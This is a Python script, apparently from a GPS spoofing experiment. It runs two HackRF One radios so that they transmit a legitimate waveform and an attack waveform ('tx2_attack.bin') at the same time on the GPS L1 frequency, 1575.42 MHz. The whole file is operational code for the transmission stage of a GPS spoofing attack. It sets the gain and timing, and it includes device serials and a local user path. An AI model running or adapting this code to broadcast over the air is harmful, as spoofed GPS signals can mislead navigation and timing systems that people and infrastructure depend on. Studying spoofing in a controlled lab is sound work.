"""
run_tx.py  — TX PC
------------------
Transmits TX1 (legitimate) and TX2 (spoofer) simultaneously
from two HackRF Ones connected to this PC.

Lowered sample rate to 2.046 Msps to half USB bus load and prevent
Windows libusb multi-device initialization conflicts.
"""

import subprocess
import threading
import time
import os
import sys

# ── Full path to hackrf_transfer.exe ─────────────────────────────────────────
HACKRF_PATH = r"C:\Users\rushi\radioconda\Library\bin\hackrf_transfer.exe"

# ── Your TX HackRF serials (from hackrf_info, short 16-character format) ──────
TX1_SERIAL   = "42a068dc283d4107"
TX2_SERIAL   = "a32868dc33507547"

# ── Waveform files ────────────────────────────────────────────────────────────
TX1_WAVEFORM = "tx1.bin"
TX2_WAVEFORM = "tx2_attack.bin"

# ── RF settings ───────────────────────────────────────────────────────────────
CENTER_FREQ_HZ = 1_575_420_000
SAMPLE_RATE    = 2_046_000       # 2.046 Msps to protect USB bandwidth
IF_GAIN        = 47
TX_DURATION_S  = 25


def transmit(hackrf_path, serial, waveform, label, stop_event):
    cmd = [
        hackrf_path,
        "-d", serial,
        "-t", waveform,
        "-f", str(CENTER_FREQ_HZ),
        "-s", str(SAMPLE_RATE),
        "-x", str(IF_GAIN),
        "-a", "0",      # Disable RF amplifier to prevent USB port power overload
        "-R",
    ]
    print(f"  [{label}] Starting transmission on {serial}...")
    try:
        proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        
        while not stop_event.is_set():
            if proc.poll() is not None:
                # Process exited on its own
                break
            time.sleep(0.1)
            
        exit_code = proc.poll()
        if exit_code is not None and exit_code != 0:
            err = proc.stderr.read().decode(errors="replace").strip()
            print(f"  [{label}] Exited with code {exit_code}. Error: {err[:300]}")
        else:
            print(f"  [{label}] Finished/Terminated successfully.")
            
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
            
    except Exception as e:
        print(f"  [{label}] ERROR: {e}")
        stop_event.set()


# ── Pre-flight checks ────────────────────────────────────────────────
if not os.path.exists(HACKRF_PATH):
    print(f"ERROR: hackrf_transfer.exe not found at:\n  {HACKRF_PATH}")
    sys.exit(1)

for f in [TX1_WAVEFORM, TX2_WAVEFORM]:
    if not os.path.exists(f):
        print(f"ERROR: {f} not found. Run the generators first.")
        sys.exit(1)

print("=" * 55)
print("  GPS Spoofing TX")
print(f"  hackrf_transfer : {HACKRF_PATH}")
print(f"  TX1 (Legit)     : {TX1_SERIAL}  ({TX1_WAVEFORM})")
print(f"  TX2 (Spoof)     : {TX2_SERIAL}  ({TX2_WAVEFORM})")
print(f"  Freq            : {CENTER_FREQ_HZ/1e6:.3f} MHz")
print(f"  Sample Rate     : {SAMPLE_RATE/1e6:.3f} Msps")
print(f"  Duration        : {TX_DURATION_S}s")
print("=" * 55)

stop_event = threading.Event()
t1 = threading.Thread(target=transmit,
                      args=(HACKRF_PATH, TX1_SERIAL, TX1_WAVEFORM, "TX1-Legit", stop_event),
                      daemon=True)
t2 = threading.Thread(target=transmit,
                      args=(HACKRF_PATH, TX2_SERIAL, TX2_WAVEFORM, "TX2-Spoof", stop_event),
                      daemon=True)

print(f"\nLaunching TX1 (Legit)...")
t1.start()

# 3.0 second delay to allow first device setup to fully complete
time.sleep(3.0)

print(f"Launching TX2 (Spoof)...")
t2.start()

try:
    time.sleep(TX_DURATION_S)
except KeyboardInterrupt:
    print("\nStopped early (Ctrl+C).")

print("\nStopping all transmissions...")
stop_event.set()
t1.join(timeout=5)
t2.join(timeout=5)
print("TX complete.")
